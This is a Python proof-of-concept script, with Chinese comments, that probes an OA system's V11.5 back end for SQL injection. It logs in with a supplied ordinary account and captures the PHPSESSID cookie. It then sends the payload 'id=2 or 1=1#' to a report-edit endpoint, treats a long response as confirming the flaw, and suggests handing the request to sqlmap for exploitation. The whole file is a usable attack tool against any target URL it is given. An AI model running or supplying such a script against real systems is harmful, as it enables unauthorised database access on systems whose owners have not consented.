import requests
import re
import time
import base64

s = requests.session() # 初始化requests.sessionh()会话对象，保持cookie

def login(host,username,password):
    url_login = host +"logincheck.php"
    # UNAME=chenqiang&PASSWORD=&encode_type=1
    passwd =base64.b64encode(password.encode())
    data={
        'UNAME':username,
        'PASSWORD':passwd,
        'encode_type':1
    }
    res = s.post(url=url_login,data=data,verify=False)
    if "正在进入OA系统" in res.text:
        print("[*] 登录成功")
    else:
        print("[-] 登录失败")
        exit()
    PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(res.headers))[0]
    print("成功获得cookie：PHPSESSID=",PHPSESSION,sep='')

def sql_injection(host,username,password):
    login(host,username,password)
    # headers = {'Accept-Encoding': "identity"}
    url = host + "general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 or 1=1#"
    try:
        res = s.get(url=url)
        length = len(res.text) #通过判断返回包的长度
        if length > 50000:
            print('[*] 存在SQL注入漏洞')
            print('请将请求包放入sqlmap跑')
        else:
            print("[-] 不存在该漏洞")
    except:
        pass

if __name__ == "__main__":
    print("[->] 正在测试V11.5后台SQL注入漏洞，需要一个普通账号")
    host = input("请输入目标URL地址：")
    username = input("请输入username：")
    password = input("请输入password：")
    sql_injection(host,username,password)